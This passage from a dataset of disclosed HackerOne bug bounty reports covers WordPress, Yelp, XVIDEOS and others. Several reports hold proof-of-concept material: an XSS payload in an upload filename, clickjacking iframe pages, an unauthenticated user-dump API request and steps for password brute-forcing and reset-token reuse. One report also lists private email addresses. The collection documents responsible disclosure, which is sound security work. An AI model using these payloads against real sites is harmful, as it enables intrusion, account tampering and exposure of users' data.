If you have any questions just tell me and I will try my best to have an answer.
Kind Regards,
Tom",https://hackerone.com/reports/221893,California,United States,Menlo Park,2017,4,18,13,40
WordPress,101-250,0.0,1m-10m,$350.00,High,7.95,Cross-site Scripting (XSS) - Generic,Wordpress 4.7.2 - Two XSS in Media Upload when file too large.,"skansing  submitted a report to WordPress.Feb 5th (6 years ago)Description
An attacker can inject a malicious script in to the filename which a victim tries to upload leading to XSS inside the administrators control panel.
Two different ""file to large"" cases end up in interpolating the file name and appending it into DOM unsanitized leading to XSS.
I have attached pictures of one of the cases, in the attached case the file was 12.4 MB, in a freshly installed environment. For reproduction note that any file type can be used (.jar whatever) as the vuln happens before the type is validated.
PoC
Create a 20MB file called 
Dinosaurs secret life<img src=x  onerror=alert(1)>.png
Goto your wordpress site http://127.0.0.1/wp-admin/media-new.php and dragndrop or use file manager or choose the file via. the ""Select Files"" button.
A error will appear with ... exceeds the maximum upload size for this site. along with a alert box to display that the payload has been executed.
Details on XSS
The file script-loader.php prepares an array of messages for use later.
Code 291 BytesWrap lines Copy Download1	// error message for both plupload and swfupload
2	$uploader_l10n = array(
3                ...
4		'file_exceeds_size_limit' => __('%s  exceeds the maximum upload size for this site.'),
5		'big_upload_failed' => __('Please try uploading this file with the %1$sbrowser uploader%2$s.'),
6		...
7	);
The payload will be injected into the %s in the key file_exceeds_size_limit.
This happens because the $uploader_l10n is passed to handlers.min.js (non minified version shown)
and interpolated without escaping the value previously.
First the value passes trough a error case 
Code 351 BytesWrap lines Copy Download1// $uploader_l10n
2case plupload.FILE_SIZE_ERROR:
3			uploadSizeError(uploader, fileObj); // fileObj contains the filename payload in name attribute.
4			break;
5....
6if ( max > hundredmb && fileObj.size > hundredmb )
7				wpFileError( fileObj, pluploadL10n.big_upload_failed.replace('%1$s', '<a class=""uploader-html"" href=""#"">').replace('%2$s', '</a>') );
and lastely interpolated and appended to the dom.
Code 502 BytesWrap lines Copy Download1
2function uploadSizeError( up, file, over100mb ) {
3	var message;
4
5	if ( over100mb )
6		message = pluploadL10n.big_upload_queued.replace('%s', file.name) + ' ' + pluploadL10n.big_upload_failed.replace('%1$s', '<a class=""uploader-html"" href=""#"">').replace('%2$s', '</a>');
7	else
8		message = pluploadL10n.file_exceeds_size_limit.replace('%s', file.name);
9
10
11	jQuery('#media-items').append('<div id=""media-item-' + file.id + '"" class=""media-item error""><p>' + message + '</p></div>');
12	up.removeFile(file);
13}
The critical lines are 
Code 264 BytesWrap lines Copy Download1message = pluploadL10n.big_upload_queued.replace('%s', file.name) + ' ' + pluploadL10n.big_upload_failed.replace('%1$s', '<a class=""uploader-html"" href=""#"">').replace('%2$s', '</a>');
2	else
3		message = pluploadL10n.file_exceeds_size_limit.replace('%s', file.name);
Suggested fix:
Remove the filename or escape safely in context.2 attachments:F157473: payload_effect.pngF157474: Payload_drop.png",https://hackerone.com/reports/203515,California,United States,Menlo Park,2017,2,5,1,16
WordPress,101-250,0.0,1m-10m,$25.00,Medium,5.8,None,code.wordpress.net subdomain Takeover,"sniperpex  submitted a report to WordPress.Dec 5th (5 years ago)Hy Wordpress sec i found as it is posible to takeover this domain http://code.wordpress.net when you navigate it you will get this error msg:
Warning! Domain mapping upgrade for this domain not found. Please log in and go to the Domains Upgrades page of your blog to use this domain. 
$ host code.wordpress.net
code.wordpress.net is an alias for wpprojects.wordpress.com.
wpprojects.wordpress.com is an alias for lb.wordpress.com.
lb.wordpress.com has address 192.0.78.13
lb.wordpress.com has address 192.0.78.12
Impact
The attacker can takeover this subdomain",https://hackerone.com/reports/295330,California,United States,Menlo Park,2017,12,5,10,44
WordPress,101-250,0.0,1m-10m,$50.00,Low,2.0,UI Redressing (Clickjacking),Clickjacking on donation page,"b0d8e6c576cada9bb87be7b  submitted a report to WordPress.Jul 12th (2 years ago)Description:
Vulnerable URL: https://wordpressfoundation.org/donate/
Clickjacking on the vulnerable URL allows an attacker to redirect a victim to do a donation at an attacker's page.
Steps To Reproduce:
1)  To test whether the page is vulnerable to clickjacking or not use this code
<!DOCTYPE HTML>
Code 324 BytesWrap lines Copy Download1<html lang=""en-US"">
2<head>
3<meta charset=""UTF-8"">
4<meta http-equiv=""refresh"" content=""5"">
5<title>i Frame</title>
6</head>
7<body>
8<center><h1>THIS PAGE IS VULNERABLE TO CLICKJACKING</h1>
9<iframe src=""https://wordpressfoundation.org/donate/"" frameborder=""0 px"" height=""1200px"" width=""1920px""></iframe>
10</center>
11</body>
12</html>
2) To test whether an attacker is able to trick the victim to donate money to the attacker's payment gateway
i) Open the attached page ""donation.html ""
ii) Click on the button give once
iii) The page will be redirected to the attacker's PayPal money request page.
*Sorry for the bad UI and please remove my payment-request id after the vulnerability check from donation.html page.
Recommendations
To control where your site can be embedded, use the frame-ancestors directive:
Content-Security-Policy: frame-ancestors 'none'  (The page cannot be displayed in a frame, regardless of the site attempting to do so.)
Content-Security-Policy: frame-ancestors 'self' (The page can only be displayed in a frame on the same origin as the page itself.)
Content-Security-Policy: frame-ancestors uri (The page can only be displayed in a frame on the specified origins.)
Impact
If an attacker is successful in tricking the victim to a click jacked page. He can trick the victim to donate money to the attacker's account. An attacker may also craft a page to gather victim's information, He may use also use BEEF hook id to take control of victim's browser.1 attachment:F904820: donation.htmlotto WordPress staff  updated the severity from medium to low. Jul 13th (2 years ago)otto WordPress staff  closed the report and changed the status to Resolved. Jul 13th (2 years ago)Thank you for the report!
As it is not necessary for any part of the WordPress Foundation site to be embedded into a frame from anywhere, the frame-ancestors directive has been set to ""none"" for that site.b0d8e6c576cada9bb87be7b   posted a comment. Jul 13th (2 years ago)The URL ""https://central.wordcamp.org/""  is also vulnerable to clickjacking, It has not much dynamic impact on the page except bulk mailing and redirecting but SCOPE IS CRITICAL.
You can use this code to test the vulnerability
<!DOCTYPE HTML>
Code 273 BytesWrap lines Copy Download1<html lang=""en-US"">
2<head>
3<meta charset=""UTF-8"">
4<title>i Frame</title>
5</head>
6<body>
7<center><h1>THIS PAGE IS VULNERABLE TO CLICKJACKING</h1>
8<iframe src=""https://central.wordcamp.org"" frameborder=""0 px"" height=""1200px"" width=""1920px""></iframe>
9</center>
10</body>
11</html>
PLEASE FIX THIS TOO.
HAPPY TO HELP : )
And any reward ??otto WordPress staff  posted a comment. Jul 13th (2 years ago)Wordcamp.org has a different setup than the wordpressfoundation.org site, and frames are used for portions of that site.
However, that specific issue was already reported years ago, and mitigations for it are already in place. Specifically, different headers are sent on wordcamp.org for logged-in users than for logged-out ones, and there is no viable threat for logged-out users. Not all instances of ""clickjacking"" are valid.
As for rewards, that is not my area. Somebody else will address that.b0d8e6c576cada9bb87be7b   posted a comment. Jul 13th (2 years ago)Ok..cool. Please let me know if this report is eligible for any bounty or swag.WordPress  rewarded b0d8e6c576cada9bb87be7b with a $50 bounty. Jul 15th (2 years ago)Hi @0_loophole_, we would like thank you again for your submission and helping make WordPress a safer place. We look forward to more reports from you in the future!b0d8e6c576cada9bb87be7b   requested to disclose this report. Jul 15th (2 years ago)Thank you for the bounty. Can we disclose this.ehtis WordPress staff  agreed to disclose this report. Jul 16th (2 years ago)Sure, as it had low security implications, going ahead with the disclosure now instead of waiting the usual 30 days.  This report has been disclosed. Jul 16th (2 years ago)",https://hackerone.com/reports/921709,California,United States,Menlo Park,2020,7,12,21,52
WP API,1-10,0.0,No value,$100.00,No value,0.0,Improper Authentication - Generic,Missing access control exposing detailed information on all users,"albinowax  submitted a report to WP API.May 12th (7 years ago)The WP REST API WordPress plugin fails to apply access controls for the 'edit' context. This means that with a single HTTP request, an attacker can obtain the following information for every single registered user: username, email address, first name, last name, date of registration, and detailed privilege information. This is a treasure trove of information for someone planning an attack - they know exactly which email addresses to target in order to gain admin privileges and complete control over the webserver.
To replicate this issue, simply send the following request while unauthenticated:
GET /wp-json/wp/v2/users?context=edit
Please note that I've submitted this report to a couple of entities directly affected by this vulnerability so they can implement a workaround.",https://hackerone.com/reports/138244,No value,No value,No value,2016,5,12,10,25
Xiaomi,10001,0.0,No value,$50.00,Medium,5.45,Cross-site Scripting (XSS) - Stored,Insecure file upload in xiaoai.mi.com Lead to Stored  XSS,h4x0r_dz  submitted a report to Xiaomi.May 26th (2 years ago),https://hackerone.com/reports/882733,Beijing,China,Beijing,2020,5,26,12,16
XVIDEOS,51-100,0.0,10m-50m,$50.00,Low,3.3,Unchecked Error Condition,Script breaking tag (Forces website to render blank) (Informative),"ch1ck3n42  submitted a report to XVIDEOS.Sep 30th (about 1 year ago)Summary:
This is a bug affecting core HTML and JS elements on the site via Search 
Steps To Reproduce:

Open https://www.xvideos.com
Click to search enter payload=  ""<!--<script>"" (without quotes) 
Hit enter or search, watch the page break and not load any content (content is loaded in console, renders page blank) 

To note this can possibly be expanded to XSS or another injection type.
xvideobroken2.png shows the HTML content cut off in the source of the page. 
Supporting Material/References:
xvideobroken.PNG (F1466873): xvideobroken.PN
xvideobroken2.PNG (F1466876): xvideobroken2.PNG
Impact
Breaks page rendering due to broken JS (Script and HTML close tags) Seems to render the website inoperable. Also seems to hang and causes memory leak due to trying to constantly load content it can't.2 attachments:F1466873: xvideobroken.PNGF1466876: xvideobroken2.PNGch1ck3n42   posted a comment. Sep 30th (about 1 year ago)Having checked the other sites in your domain, all are vulnerable to this bug (all public) (didn't signup to test) h1_analyst_everton HackerOne triage  closed the report and changed the status to Not Applicable. Oct 1st (about 1 year ago)Hey @ch1ck3n42
After review, there doesn’t seem to be any security risk and/or security impact as a result of the behavior you are describing. If you are able to leverage this into a practical exploitation scenario, we will be happy to reevaluate this report, but at this time, it does not present a significant security risk. 
As a result, we will be closing this report. Nevertheless, we appreciate your effort and look forward to seeing more reports from you in the future. 
Kind regards.xvtech   reopened this report. Oct 1st (about 1 year ago)xvtech   updated the severity from medium (6.6) to low (3.3). Oct 1st (about 1 year ago)xvtech   closed the report and changed the status to Resolved. Oct 1st (about 1 year ago)Thanks ! Issue is solvedXVIDEOS  rewarded ch1ck3n42 with a $50 bounty and a $100 bonus. Oct 1st (about 1 year ago)xvtech   requested to disclose this report. Oct 1st (about 1 year ago)ch1ck3n42   posted a comment. Oct 1st (about 1 year ago)Thank you so much. I hope you have an amazing weekend!! You just made my month!! xvtech   disclosed this report. Oct 23rd (about 1 year ago)",https://hackerone.com/reports/1355537,Prague,Czechia,Prague,2021,9,30,16,8
XVIDEOS,51-100,0.0,10m-50m,$100.00,Low,2.0,None,No-Rate limit of current password on delete account endpoint(https://www.xvideos.com/account/close),"rajput__16  submitted a report to XVIDEOS.Nov 5th (about 1 year ago)Hi Team!!!
This Attack happen when victim login in other device and forget to logout ,Then attacker can delete  it's account by brute force the current password because current password has no-rate limit.
After guessing current password attacker can easily delete the victim account.
Steps To Reproduce:
1.Login in https://www.xvideos.com/ with right credentials
2.Navigate to Dashboard --> Account->  Delete my account and Personal Data
3.add random password in current password field
4.Capture the request and send it for fuzz
you get a different response when you enter a right password.
****  Response in right password :-
Too fast. Please try again in few seconds
           Response of wrong password :-
Too fast. Please try again in few seconds is missing.
POC - I have attached a video poc in which I demonstrate the attack.
Impact
As Attacker I can delete victim account by brute force the victim current password, Due to no-rate limit on this endpoint.1 attachment:F1504413: xvideo_delete.mp4xvtech   updated the severity to low. Nov 5th (about 1 year ago)XVIDEOS  rewarded rajput__16 with a $100 bounty. Nov 5th (about 1 year ago)xvtech   closed the report and changed the status to Resolved. Nov 5th (about 1 year ago)Hi,
The issue is fixed. Thanks for you report and keep up the good work.
Regardsrajput__16   posted a comment. Nov 12th (about 1 year ago)can disclose it ??h1_analyst_dhaval HackerOne triage  posted a comment. Nov 15th (about 1 year ago)Hi @rajput__16,
If you wish to request disclosure, please do so using the provided action menu on your right. You can read more about the step at https://docs.hackerone.com/hackers/disclosure.html#requesting-disclosure.
Once you submit the request, the XVIDEOS Team shall review it and let you know if this report can be disclosed.
Kind Regards,
@saffronrajput__16   requested to disclose this report. Nov 18th (about 1 year ago)xvtech   agreed to disclose this report. Nov 23rd (12 months ago)  This report has been disclosed. Nov 23rd (12 months ago)",https://hackerone.com/reports/1392287,Prague,Czechia,Prague,2021,11,5,11,2
Yahoo!,10001,0.0,1m-10m,$250.00,No value,0.0,Information Disclosure,readble .htaccess + Source Code Disclosure  (+ .SVN repository),nahamsec  submitted a report to Yahoo!.Apr 17th (9 years ago)nahamsec   posted a comment. Apr 20th (9 years ago)junot   changed the status to Triaged. Apr 22nd (9 years ago)junot   closed the report and changed the status to Resolved. May 9th (9 years ago)nahamsec   posted a comment. May 9th (9 years ago)Yahoo!  rewarded nahamsec with a $250 bounty. Jun 6th (8 years ago)nahamsec   requested to disclose this report. Jul 15th (8 years ago)schofield   agreed to disclose this report. Aug 20th (8 years ago)  This report has been disclosed. Aug 20th (8 years ago),https://hackerone.com/reports/7813,California,United States,Sunnyvale,2014,4,17,6,35
Yelp,5001-10000,0.0,200m-1b,$100.00,No value,0.0,Privilege Escalation,Able to download arbitrary  PHP files at yelpblog.com,"ret2jazzy  submitted a report to Yelp.Dec 28th (6 years ago)There is a misconfigured wordpress installation at yelpblog.com, through which i am able to download any php files in wp-includes folder.
For a PoC, you can open https://www.yelpblog.com/wp-includes/wp-db.php, and the wp-db.php will be download(along with all the data in it)
As we all know that these PHP files can sensative information of a website, and the wp-includes folder is the base of a WordPress installation, Being able to download php files is a clearly wrong behaviour of a wordpress installation.
The PHP files in wp-includes can have a lot of sensative information about the server, which may help a attacker in compromising the server. He can even do a source code analysis if he is able to download arbitrary
PHP files.1 attachment:F147710: PHP.png Bot:  posted a comment. Dec 28th (6 years ago)Hi there!
Thanks for submitting your report to us! Please expect a response within a week.
Best,
The Yelp Security Teamret2jazzy   posted a comment. Jan 3rd (6 years ago)Hey, any updates?
It's been a week😶jimmyt   changed the status to Triaged. Jan 3rd (6 years ago)I wanted to thank you for helping us protect the Yelps. Keeping our users, our data, and our sites safe is really important to us. We're huge fans of responsible disclosure and appreciate you giving us the opportunity to fix this issue.
We're working on a fix and we'll be sure to quickly update things in HackerOne when our fix is live.
Thanks for being awesome!ret2jazzy   posted a comment. Updated Jan 6th (6 years ago)I see that the bug has been fixed :)
When can i expect a bounty decision on it??5a37bf56c8   updated the severity from high to none. Jan 6th (6 years ago)5a37bf56c8   closed the report and changed the status to Resolved. Jan 6th (6 years ago)Hi there!
This issue was on WP Engine side, not ours. Further, since WP's source code is public, the ability to download the code from our site did not expose further sensitive details.
Best,
The Yelp Security TeamYelp  rewarded ret2jazzy with a $100 bounty. Jan 6th (6 years ago)ret2jazzy   requested to disclose this report. Jan 7th (6 years ago)Can we?  This report has been disclosed. Feb 6th (6 years ago)",https://hackerone.com/reports/194351,California,United States,San Francisco,2016,12,28,7,43
Yelp,5001-10000,0.0,200m-1b,$500.00,Low,3.5,UI Redressing (Clickjacking),ClickJacking on IMPORTANT Functions of Yelp,"hk755a  submitted a report to Yelp.Jan 16th (5 years ago)SUMMARY:
Few Important function of yelp.com are vulnerable to ClickJacking Attack.
DESCRIPTION:
Please have an Introduction about the vulnerability Type: https://en.wikipedia.org/wiki/Clickjacking
ClikcJacking is similar to CSRF with just an extra involvement of the victim to click somewhere on the ClickJacked page (which is usually done very easily).
It bypasses CSRF token protection & Its impact could be critical depending on the component/function it can affect. At yelp.com I have found the following functions to be vulnerable:
##1.) Report A profile  (With custom Message in it)
Using URL:
https://www.yelp.com/flag_content?message=This%20person%20is%20abusive&flag_id=aV0sVlYtxt7_2SJ7X_b-3A&flag_type=user_profile&previous_url=%2Fuser_details%3Fuserid%3DaV0sVlYtxt7_2SJ7X_b-3A
##2.) Follow a user
Using URL:
https://www.yelp.com/following_user/add?dst_user_id=aV0sVlYtxt7_2SJ7X_b-3A&previous_url=/user_details?userid=aV0sVlYtxt7_2SJ7X_b-3A
##3.) Send A Compliment (With Custom message in it)**
Using URL:
https://www.yelp.com/thanx?message=go%20to%20hell&previous_url=/user_details?userid=aV0sVlYtxt7_2SJ7X_b-3A&user_id=aV0sVlYtxt7_2SJ7X_b-3A
POC:
PLEASE WATCH THE 1 minute POC VIDEO TO SEE HOW THESE URL ARE EMBEDDED INTO HIDDEN IFRAMES AND HOW THE VICTIM IS EXPLOITED. THE HTML FILES USED IN THE VIDEO ARE ATTACHED IN THIS REPORT
THE POC ALSO SHOWS THE IMPACT OF THE VULNERABILITY
MITIGATION
These attacks could be circumvented by using ""X-Frame-Options"" Header.
Impact
Such vulnerability when exploited in the wild by the attackers would :
1.) Affect the users interaction on your platform. Such unintended behavior is definitely not wanted by any user.
2.) Such effect upon your users could significantly harm your overall reputation and customer loss.4 attachments:F254262: Dangerous_ClickJacking_Yelp.flvF254263: Follow_User.htmlF254264: Report_a_USER.htmlF254265: Send_a_Compliment.html Bot:  posted a comment. Jan 16th (5 years ago)Hi there!
Thanks for submitting your report to us! Please expect a response within a week.
Best,
The Yelp Security Teamdchan   changed the status to Triaged. Jan 17th (5 years ago)Hi @hk755a 
Thanks for the report! #2 is a duplicate that you were linked to in your previous report. We'll look into fixing #1 and #3.
Thanks,
Davidhk755a   posted a comment. Jan 22nd (5 years ago)Hey David
Any recent plans for solving this ?
Thanksdchan   posted a comment. Jan 22nd (5 years ago)Hi @hk755a 
We filed an internal ticket and will assign it to a sprint. Unfortunately, we don't have an ETA for the patch.
Thanks,
Davidhk755a   posted a comment. Feb 22nd (5 years ago)Hi @dchan
I was wondering if there are any updates regarding this report.
Thanks,
HimanshuYelp  rewarded hk755a with a $500 bounty. Mar 7th (5 years ago)Hi @hk755a 
We're working on a fix for the issue but it turned out to be more complicated than expected. Unfortunately setting X-Frame-Options: SAMEORIGIN doesn't cover all cases. 
The bounty committee approved paying out this bug before a fix. We will update you again once the bug is resolved. Thanks for keeping Yelp safe!dchan   added weakness ""UI Redressing (Clickjacking)"" and removed weakness ""Improper Access Control - Generic"". May 1st (5 years ago)vzhou   closed the report and changed the status to Resolved. Feb 21st (3 years ago)Hi @hk755a,
Thank you for your patience! We have started setting a Content-Security-Policy frame-ancestors header on these pages. This prevents these endpoints from being used in the described clickjacking attack. Please see the attached screenshot to see what this looks like on the user's end. We acknowledge that this only protects users using newer browsers, but consider this acceptable.
We appreciate your diligent effort in this matter, and encourage you to keep banging away on the Yelps. Thanks for helping keep our users safe!
Best,
The Yelp Security Team1 attachment:F724769: Screen_Shot_2020-02-21_at_3.34.44_PM.pnghk755a   requested to disclose this report. Jul 28th (2 years ago)I was wondering if you could disclose the report?aaronloo   updated the severity from medium to low (3.5). Aug 21st (2 years ago)aaronloo   agreed to disclose this report. Aug 21st (2 years ago)  This report has been disclosed. Aug 21st (2 years ago)",https://hackerone.com/reports/305128,California,United States,San Francisco,2018,1,16,7,45
Yelp,5001-10000,0.0,200m-1b,$200.00,No value,0.0,Improper Authentication - Generic,Bybass The Closing of the account and logged again to your account,"ymy  submitted a report to Yelp.Sep 11th (6 years ago)Hello
### Details:
All My accounts have been closed i dnot know the reason so i have played around and manged to bypass this mechanism using the last unused password token  
Steps:

go to forget password page and get new password reset token and dnot use it 
go  and make anything against the rules lead to close your account [ I dnot know what make it close :D]
go to your email and using the reset password email you will go to the change password page 
Enter the new password two times you will get in in your profile
You can edit your privacy and password ,info but when you try to enter your email page the server will respond with 500 internal error 
if you try to write review the server will respond with 500 internal server error 
if you try to edit your profile will respond with 500 server error 

Fix:

when you close the account make sure you expire all reset token associted with it

closed_account_used in test:
Code 24 BytesWrap lines Copy Download1tamdoooooooooo@gmail.com
the closed_accounts:
Code 68 BytesWrap lines Copy Download1tamdoooooooooooooo@gmail.com,tuser387@yahoo.com
2testuser.t@yahoo.com
 I hope you open it again 
Thanks2 attachments:F118951: 500_internal_servar_error.pngF118952: account_view.png Bot:  posted a comment. Sep 11th (6 years ago)Thanks for submitting your report to us! We just launched our public bug-bounty program on HackerOne. Please expect a response within a week.

The Yelp Security Team
ymy   posted a comment. Updated Sep 11th (6 years ago)Sorry for incomplete report,
### Actions Can be made:

Adding photos to biz photos and delete them,edit the caption
Adding friends and sending the message you want to add them
sending complimant  
Adding new location 
sending Email Invites 
Follow other people 
connect the email with other 3 rdparties like google

Actions Canot be made:

writing reviews 
sending messages
making talks
another user canot accept the friend request
ymy   posted a comment. Sep 13th (6 years ago)Any Update?ymy   posted a comment. Sep 14th (6 years ago)@yelp-com-86d022dacf  any update about this one?
Thanksymy   posted a comment. Sep 15th (6 years ago)@5a37bf56c8  Any Update about this report sir?
Thanks5a37bf56c8   changed the status to Triaged. Sep 15th (6 years ago)Hello @youssefmahmoud,
Thanks for submitting your report to us!
We are investigating the reported issue and will update this thread once we have further details.
Best,
The Yelp Security Teamymy   posted a comment. Sep 20th (6 years ago)Hello Can i Ask When The Bounty Will be Adressed to this and the other issues belongs to me id you dnot mind  ?
Thanks5a37bf56c8   closed the report and changed the status to Resolved. Sep 21st (6 years ago)Hi there!
We have deployed a fix to address the reported issue.
Best,
The Yelp Security TeamYelp  rewarded ymy with a $200 bounty. Sep 21st (6 years ago)ymy   requested to disclose this report. Sep 21st (6 years ago)can we disclosure if you dnot mind but hide my emails or making summary ?
Thanks5a37bf56c8   posted a comment. Oct 4th (6 years ago)Hello @youssefmahmoud,
Go ahead and write a summary. We can then review and disclose accordingly.
Best,
The Yelp Security Team  This report has been disclosed. Oct 21st (6 years ago)Summary by ymyMy Accounts have  Been Closed so i was playing around and found this bug that allow me to login again to my account through the unused nonexpired reset password token.as after you reset your password  the web app redirect you directly to your profile.
Actions Can be made:

Adding photos to biz photos and delete them,edit the caption
Adding friends and sending the message you want to add them
sending complimant
Adding new location
sending Email Invites
Follow other people

Actions Canot be made:

writing reviews
sending messages
making talks
another user canot accept the friend request
Show more",https://hackerone.com/reports/167489,California,United States,San Francisco,2016,9,11,1,31
Yelp,5001-10000,0.0,200m-1b,"$1,500.00",No value,0.0,Improper Authentication - Generic,Access to internal CMS containing private Data,"nahamsec  submitted a report to Yelp.Nov 22nd (7 years ago)nahamsec   posted a comment. Nov 22nd (7 years ago)nahamsec   posted a comment. Nov 28th (7 years ago)vivekraman   closed the report and changed the status to Resolved. Dec 4th (7 years ago)Yelp  rewarded nahamsec with a $1,500 bounty. Dec 4th (7 years ago)nahamsec   posted a comment. Oct 6th (6 years ago)5a37bf56c8   posted a comment. Oct 6th (6 years ago)nahamsec   posted a comment. Oct 7th (6 years ago)vivekraman   requested to disclose this report. Oct 7th (6 years ago)nahamsec   agreed to disclose this report. Oct 7th (6 years ago)  This report has been disclosed. Oct 7th (6 years ago)Summary by nahamsecI was able to access to sensu on two different  IP addresses belonging to Yelp. Looking through the logs available on sensu, I was able to escalate this vulnerability and gain access  and login to RabbitMQ.",https://hackerone.com/reports/100926,California,United States,San Francisco,2015,11,22,8,6
Yelp,5001-10000,0.0,200m-1b,$100.00,Low,2.0,Cross-Site Request Forgery (CSRF),Clickjacking Vulnerability found on Yelp,"hckyguy77  submitted a report to Yelp.Mar 17th (6 years ago)As many companies do, Yelp set its X-Frame-Options to SAME ORIGIN in its HTTP headers; but unfortunately our exploitation proves that not all the pages are protected.
With the use of iframes in the html document, I was able to discover a clickjacking vulnerabilities on Yelp.com, and this vulnerability could lead to a whole bunch of bad things happening to yelp and its users. Just like every other clickjacking issue, all of the issues I found rely on the ignorance of the user into visiting a link, while they are currently logged into yelp. Technically, an attacker can trick a yelp user to do anything or everything that they normally can do but wouldn't do, so this is like a CSRF attack, but it's worse than CSRF, as usually CSRF only causes one specific issue, but the clickjacking attack I have demonstrated here, can lead to many issues for Yelp users. Due to limited time and resource, I selected three issues to demonstrate and I recorded some videos to demonstrate them, but if needed, I can certainly demonstrate more issues due to this same vulnerability. Here are the introduction of the videos recorded in this report:
Tricking a user into unknowingly;
No.1: bookmarking unwanted business'
No.2: adding events to their profile they are interested in attending.
No. 3: editing their star rating on reviews;
More detailed explanation to each video:
No.1 trick_user_bookmark : This one is tricking the victim into bookmarking a page that they really may not want to have on their account. Since things like strip clubs are an option on yelps site, it can deface a person's account based on who is seeing the info. Which sharing with friends is very much apart of this site.
No.2 trick_user_into_add_event_to_profile = the victim thinks that they have won something cool and that they need to click on the link to secure the item. Doing so has added the event to their profile.
No.3 trick_user_to_edit_review = This one will rely on multiple clicks, but we can definitely assume that anyone clicking once, will probably keep clicking. Although the review will still sound positive, the rating of the company will not reflect on that.
No.4 trick_user_to_edit_review_withyelp_transparent = shows the vulnerability happening, while the user cannot see the yelp page. This one is pretty much the same as video No.3, but this time I made yelp.com transparent, so it is what would happen in real world attacks. When yelp.com is completely hidden, the user will have no idea.
I added video's to help give a visual representation of what is happening so that you may recreate this issue if you need to with ease.6 attachments:F169459: hack.htmlF169460: index.htmlF169461: trick_user_to_add_event_to_profile.mp4F169462: trick_user_bookmark.mp4F169463: trick_user_to_edit_review.mp4F169465: trick_user_to_edit_review_withyelp_transparent.mp4 Bot:  posted a comment. Mar 17th (6 years ago)Hi there!
Thanks for submitting your report to us! Please expect a response within a week.
Best,
The Yelp Security Teamyelp-com-dd02f565e7   changed the status to Triaged. Mar 21st (6 years ago)5a37bf56c8   updated the severity from high (7.3) to low. Mar 30th (6 years ago)5a37bf56c8   closed the report and changed the status to Resolved. Apr 12th (6 years ago)Hi there!
We have deployed a fix to address the reported issue.
Best,
The Yelp Security TeamYelp  rewarded hckyguy77 with a $100 bounty. Apr 12th (6 years ago)hckyguy77   posted a comment. Apr 12th (6 years ago)That is awesome. Thank you for the bounty! would you be okay with disclosing?hckyguy77   requested to disclose this report. Apr 12th (6 years ago)hckyguy77   posted a comment. Apr 12th (6 years ago)Before you do decide to disclose or not I have a question maybe you would be willing to answer. I remember yelp.com using SAMEORIGIN in its X-Frame-Options HTTP headers. This is a known public solution to prevent pages from being loaded into iframes. This has me wondering, why was this was still able to happen?   This report has been disclosed. May 12th (6 years ago)",https://hackerone.com/reports/214087,California,United States,San Francisco,2017,3,17,5,58
Yelp,5001-10000,0.0,200m-1b,"$2,000.00",High,7.2,Privacy Violation,CRITICAL Insecure Direct Object Reference (I.D.O.R) - Link Other User's Credit Card ,hk755a  submitted a report to Yelp.May 27th (4 years ago),https://hackerone.com/reports/358143,California,United States,San Francisco,2018,5,27,19,3
Yelp,5001-10000,0.0,200m-1b,$500.00,Medium,6.3,Improper Access Control - Generic,CRITICAL-CLICKJACKING at Yelp Reservations Resulting in exposure of victim Private Data (Email info) + Victim Credit Card MissUse. ,"hk755a  submitted a report to Yelp.May 22nd (4 years ago)Please have a look at this interesting article with precise explanation about Click-jacking security flaw:
https://www.linkedin.com/pulse/20141202104842-120953718-why-am-i-anxious-about-clickjacking/
In Yelp platform the response headers of the Reservation page does not contain the X-Frame-Options header, thus allowing malicious actors to embed these pages as hidden i-frames on some external or their own innocuous looking website.
Upon successful exploitation the victim would have made unintentional reservation to some restaurant/bar and his Email Id/Mobile Number would have been shared with the business.
All this would  happen without victim's  knowledge or consent.
Here's how a sample Reservation page looks like:
Image F300312: sample_reservation_page.jpg 216.94 KiBZoom in Zoom out Copy Download
REQUEST RESPONSE HEADERS OF A RESERVATION PAGE:
Image F300310: REQUEST-RESPONSE_HEADERS.jpg 422.14 KiBZoom in Zoom out Copy Download
Please note the missing X-Frame-Options header in the response headers.
POC:
For POC and steps to reproduce please watch the video 
EXPLOIT SCENARIOS:
Please look at the different scenarios this could be exploited :
==>(1) The attacker may himself register a business at yelp, copy and embed his own reservation url as hidden i-frame. Make reservation in the background upon victim's click. He gains email/mobile of the victim account.
==>(2) He may reserve a table of some business that charges upon cancellation and the victim may face monetary loss.
==>(3) He may target a business and  try to restrict all the genuine bookings. It would be possible to do so by booking all table slots of different timings from all the different visitors that are coming to his malicious but genuine looking website.
The impact of this vulnerability depends on the number of visitors attacker might be able to bring to his website. This is not a very big deal in the presence of huge social media websites nowadays. Or he may paste link to his website somewhere on yelp (review/about/talk etc sections) platform itself so as to bring authenticated yelp users to his website.
Impact
While the  overall risk may only be a medium rating; the impact is high as the vulnerability affects both the yelp users and also business owners
The vulnerability impacts the victim in the following ways:
==>1.) Loss of Confidentiality: Private info such as Email/phone is disclosed
==> 2.) Unauthorized Reservations from User Account: This certainly is not wanted by any user.
==> 3.) Monetary loss upon Cancellation of reservation: Some businesses say they would charge upon
cancellation of reservation.
==> 4.) Apart from this client's trust on Yelp platform is also lost.
The vulnerability impacts the business owners in the following ways:
==>1.) Fake reservations may restrict genuine reservations:
Such Fake reservations may restrict genuine users from booking tables. And on the other end the business owners have no way to distinguish between fake and genuine ones.
This leads to customer/monetary loss to business owners itself.3 attachments:F300310: REQUEST-RESPONSE_HEADERS.jpgF300311: EMBEDDED_IFRAME_ON_WEB_PAGE.flvF300312: sample_reservation_page.jpghk755a   posted a comment. May 27th (4 years ago)If there are any issues in the reproduction of the bug, i am more than willing to help out!
Thanksdchan   changed the status to Triaged. May 30th (4 years ago)Hi @hk755a 
Thanks for the report. We reproduced the issue and are working with the product team on a fix.
Davidhk755a   posted a comment. Jun 5th (4 years ago)@dchan
This seems to be fixed now. Could you please share any  updates at your end ?Yelp  rewarded hk755a with a $500 bounty. Jun 5th (4 years ago)Hi @hk755a 
Thanks again for the report. We pushed out a fix as you noticed.
Daviddchan   closed the report and changed the status to Resolved. Jun 5th (4 years ago)hk755a   posted a comment. Jun 6th (4 years ago)Thanks David :)hk755a   requested to disclose this report. Jul 28th (2 years ago)I was wondering if you could disclose the report?aaronloo   updated the severity from high (7.1) to medium (6.3). Aug 21st (2 years ago)aaronloo   agreed to disclose this report. Aug 21st (2 years ago)  This report has been disclosed. Aug 21st (2 years ago)",https://hackerone.com/reports/355859,California,United States,San Francisco,2018,5,22,11,27
